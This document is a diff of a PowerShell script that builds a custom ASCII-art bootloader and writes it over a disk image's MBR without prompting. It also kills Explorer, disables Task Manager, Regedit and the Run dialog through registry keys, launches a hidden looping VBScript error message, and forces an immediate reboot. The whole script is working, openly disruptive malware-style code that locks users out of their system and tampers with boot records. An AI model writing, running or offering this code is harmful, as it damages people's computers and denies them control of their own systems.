@@ -1,29 +1,53 @@
-# Part 1: Check for NASM and Win32 Disk Imager, Download if Necessary
+# Part 2: Check for NASM and Win32 Disk Imager, Download if Necessary
 
+Write-Host "Checking for NASM..."
 # Step 1: Check if NASM is installed
 $nasmpath = Get-Command nasm -ErrorAction SilentlyContinue
 if ($nasmpath -eq $null) {
-    # Install NASM using Chocolatey package manager
-    choco install nasm -y > $null 2>&1
+    Write-Host "NASM not found. Downloading NASM..."
+    # Download NASM from official site
+    $nasmUrl = "https://github.com/netwideassembler/nasm/releases/download/v2.15.05/nasm-2.15.05-win64.zip"
+    $nasmZipPath = "$env:TEMP\nasm.zip"
+    
+    # Download the zip file
+    Invoke-WebRequest -Uri $nasmUrl -OutFile $nasmZipPath
+
+    # Extract NASM
+    Write-Host "Extracting NASM..."
+    Expand-Archive -Path $nasmZipPath -DestinationPath "$env:TEMP\nasm"
+    
+    # Add NASM to PATH for this session
+    $nasmPath = "$env:TEMP\nasm\nasm-2.15.05\bin\win64\nasm.exe"
+    $env:Path += ";$($nasmPath)"
+
+    Write-Host "NASM installed and ready to use."
+} else {
+    Write-Host "NASM is already installed."
 }
 
+Write-Host "Checking for Win32 Disk Imager..."
 # Step 2: Check if Win32 Disk Imager is installed, and download if necessary
 $win32DiskImagerPath = "C:\Program Files (x86)\Win32DiskImager\Win32DiskImager.exe"
 if (-Not (Test-Path $win32DiskImagerPath)) {
+    Write-Host "Win32 Disk Imager not found. Installing..."
     # Download the latest version of Win32 Disk Imager
     $downloadUrl = "https://github.com/raspberrypi/Win32DiskImager/releases/download/v1.0.0/Win32DiskImager-1.0.0-install.exe"
     $installerPath = "$env:TEMP\Win32DiskImager-Installer.exe"
     
     # Download the installer
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath > $null 2>&1
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath
 
     # Run the installer silently
-    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait > $null 2>&1
+    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
 
     # Clean up the installer
     Remove-Item $installerPath -Force
+    Write-Host "Win32 Disk Imager installed."
+} else {
+    Write-Host "Win32 Disk Imager is already installed."
 }
 
+Write-Host "Creating Bootloader..."
 # Step 3: Create the bootloader assembly file (boot.asm)
 $assemblyCode = @"
 ; boot.asm - Custom bootloader displaying ASCII art
@@ -60,30 +84,48 @@ ascii_art:
 $asmFilePath = "boot.asm"
 $assemblyCode | Out-File -FilePath $asmFilePath -Encoding ASCII
 
+Write-Host "Assembling Bootloader..."
 # Step 4: Assemble the bootloader using NASM
 $bootBinPath = "boot.bin"
-nasm -f bin $asmFilePath -o $bootBinPath > $null 2>&1
+nasm -f bin $asmFilePath -o $bootBinPath
 
-# Step 5: Ask for Disk Image/Virtual Disk Path
-$diskImagePath = Read-Host "Enter the full path of the disk image (e.g., C:\path\to\your\virtualdisk.img)"
+Write-Host "Bootloader binary created."
 
-# Step 6: Write the bootloader to the MBR using Win32 Disk Imager
-Start-Process -FilePath $win32DiskImagerPath -ArgumentList "$diskImagePath", "$bootBinPath" -Wait > $null 2>&1
+# Set a **hardcoded** disk image path (replace with your desired path)
+$diskImagePath = "C:\path\to\your\virtualdisk.img"
+
+Write-Host "Overwriting disk image at $diskImagePath..."
+# Step 6: Overwrite the existing disk image directly (no user interaction)
+if (Test-Path $diskImagePath) {
+    Write-Host "Overwriting the disk image at $diskImagePath..."
+
+    # Run Win32DiskImager to write the bootloader binary to the MBR (this replaces the disk image)
+    Start-Process -FilePath $win32DiskImagerPath -ArgumentList "$diskImagePath", "$bootBinPath" -Wait
+
+    Write-Host "Bootloader written to the disk image."
+} else {
+    Write-Host "The specified disk image path does not exist. Please check the path and try again."
+    exit
+}
 
 # Optional: Clean up assembly files
 Remove-Item $asmFilePath -Force
+Write-Host "Cleaned up temporary files."
 
 
-# Part 2: Kill Explorer and Disable Task Manager, Regedit, and Run Dialog
+# Part 1: Kill Explorer and Disable Task Manager, Regedit, and Run Dialog
 
+Write-Host "Killing Explorer..."
 # Kill Explorer
 Stop-Process -Name "explorer" -Force
 
+Write-Host "Disabling Task Manager, Regedit, and Run Dialog..."
 # Disable Task Manager, Regedit, and Run Dialog by modifying the registry
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1 -Force
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRun" -Value 1 -Force
 
+Write-Host "Creating VBScript to show error message..."
 # Create VBScript to show Modeus-style error message and loop
 $vbscriptPath = "$env:TEMP\error.vbs"
 
@@ -95,9 +137,14 @@ Loop
 "@
 Set-Content -Path $vbscriptPath -Value $vbscriptContent
 
+Write-Host "Running VBScript..."
 # Run the VBScript silently in the background
 Start-Process "wscript.exe" -ArgumentList $vbscriptPath -WindowStyle Hidden
 
+Write-Host "Forcing restart in 15 seconds..."
 # Force restart after 15 seconds
+Start-Sleep -Seconds 15
+Shutdown.exe /r /f /t 0
+
 Start-Sleep -Seconds 15
 Shutdown.exe /r /f /t 0
